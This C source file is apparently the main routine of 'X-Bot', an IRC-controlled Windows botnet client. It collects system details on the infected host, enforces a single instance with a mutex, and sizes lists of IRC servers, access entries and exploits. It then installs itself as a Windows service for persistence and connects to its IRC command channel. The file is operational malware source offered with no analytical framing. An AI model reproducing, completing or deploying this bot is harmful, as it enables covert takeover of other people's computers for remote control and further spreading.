/* 

  X-Bot

*/


#include "includes.h"
#include "globals.h"
#include "config.h"
#include "externs.h"

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{

	memset(&MainStruct, 0, sizeof(MAINSTRUCT));

	MainStruct.IsNTBased = XCheckNTBased();

	MainStruct.StartupTime = GetTickCount() / 1000;

	MainStruct.CurrentProcessPid = GetCurrentProcessId();
	#ifdef DEBUG_SYSTEM
//	printf("\r\nCurrent PID: %lu\r\n",MainStruct.CurrentProcessPid);
	dbg("Current PID: %lu",MainStruct.CurrentProcessPid);
	#endif

	MainStruct.CurrentCommandLine = GetCommandLine();


	MainStruct.CurrentFilename = (char *)XHeapAlloc(MAX_PATH*2);
	MainStruct.StartupDirectory = (char *)XHeapAlloc(MAX_PATH*2);
	MainStruct.WindowsDirectory = (char *)XHeapAlloc(MAX_PATH*2);
	MainStruct.SystemDirectory = (char *)XHeapAlloc(MAX_PATH*2);
	MainStruct.ComputerName = (char *)XHeapAlloc(MAX_PATH*2);
	GetModuleFileName(GetModuleHandle(NULL), MainStruct.CurrentFilename, MAX_PATH*2);

	GetCurrentDirectory(MAX_PATH*2, MainStruct.StartupDirectory);

	#ifdef DEBUG_SYSTEM
	dbg("MainStruct.StartupDirectory: %s", MainStruct.StartupDirectory);
	#endif

	GetSystemDirectory(MainStruct.SystemDirectory, MAX_PATH*2);

	#ifdef DEBUG_SYSTEM
	dbg("MainStruct.SystemDirectory: %s", MainStruct.SystemDirectory);
	#endif

	GetWindowsDirectory(MainStruct.WindowsDirectory, MAX_PATH*2);

	#ifdef DEBUG_SYSTEM
	dbg("MainStruct.WindowsDirectory: %s", MainStruct.WindowsDirectory);
	#endif

	DWORD sz = MAX_PATH*2;

	GetComputerName(MainStruct.ComputerName, &sz);

	#ifdef DEBUG_SYSTEM
	dbg("MainStruct.ComputerName: %s", MainStruct.ComputerName);
	#endif

	MainStruct.MainMutex = CreateMutex(NULL, FALSE, ID);

	

	if (WaitForSingleObject(MainStruct.MainMutex, 30000) == WAIT_TIMEOUT) // was 60000
	{
	//	dbg("timeout");
	//	ReleaseMutex(MainStruct.MainMutex);
		ExitProcess(0);
	}

	MainStruct.ServerListSize = sizeof(ServerList)/sizeof(*ServerList);
	MainStruct.AccessListSize = sizeof(AccessList)/sizeof(*AccessList);
	MainStruct.VersionListSize = sizeof(VersionList)/sizeof(*VersionList);
	MainStruct.ExploitListSize = sizeof(ExploitList)/sizeof(*ExploitList);


	if (MainStruct.IsNTBased)
	{
		#ifdef STARTUP
		SERVICE_TABLE_ENTRY DispatchTable[] = {{XDefaultServiceName, XServiceStartupHandler}, {NULL, NULL}};

		StartServiceCtrlDispatcher(DispatchTable);

		if (!XInstall())
		{
			ReleaseMutex(MainStruct.MainMutex);
			//CloseHandle(MainStruct.MainMutex);
			XCreateService(NULL, XDefaultServiceName, XDefaultServiceDisplayName, MainStruct.CurrentFilename, FALSE);
		}
		#else
		XIRCStartup();
		#endif

	}
	else
	{
		XInstall();

		XIRCStartup();

	}

	#ifdef DEBUG_SYSTEM
	dbg("X-Bot Terminating...");
	#endif

	#ifdef DEBUG_SYSTEM
	#ifdef DEBUG_LOGGING
	DeleteCriticalSection(&LogCriticalSection);
	#endif
	#endif

//	system("pause");

	ExitProcess(0);

	return 0;
}













































/*
//Restart IRC Socket
void irc_disconnect(SOCKET bsock)
{
	closesocket(bsock);
	Sleep(1000);
	WSACleanup();
	return;
}
*/


//sendnick For BotNick








// globals
//IRC mainirc;
//BOOL success = FALSE;
//int current_version = 0;
/*
#include "includes.h"
#include "externs.h"
*/

bool XCheckUpdate()
{
	return false;
}





